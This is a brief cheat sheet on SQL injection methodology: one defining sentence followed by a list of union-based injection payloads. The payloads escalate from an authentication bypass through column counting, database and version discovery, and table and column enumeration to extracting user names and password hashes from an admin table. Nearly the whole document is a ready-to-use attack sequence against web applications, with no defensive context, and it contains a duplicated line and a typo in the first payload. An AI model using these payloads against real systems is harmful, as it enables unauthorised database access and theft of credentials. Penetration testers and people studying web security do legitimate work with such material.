#### SQL Injection Methodology
SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).

```
' or1=1-- -

' UNION SELECT NULL,NULL,NULL,NULL-- -

' UNION SELECT 1,2,3,4-- -

123123' UNION SELECT NULL,NULL,NULL,NULL-- -

123123' UNION SELECT NULL,database(),NULL,NULL-- -

123123' UNION SELECT NULL,@@version,NULL,NULL-- -

123123' UNION SELECT NULL,table_name,NULL,NULL from information_schema.tables-- -

123123' UNION SELECT NULL,table_name,NULL,NULL from information_schema.tables-- -

123123' UNION SELECT NULL,table_name,table_schema,NULL from information_schema.tables-- -

123123' UNION SELECT NULL,column_name,table_schema,NULL from information_schema.columns-- -

123123' UNION SELECT NULL,column_name,table_name,NULL from information_schema.columns-- -

123123' UNION SELECT NULL,user,hash,NULL from admin-- -
```
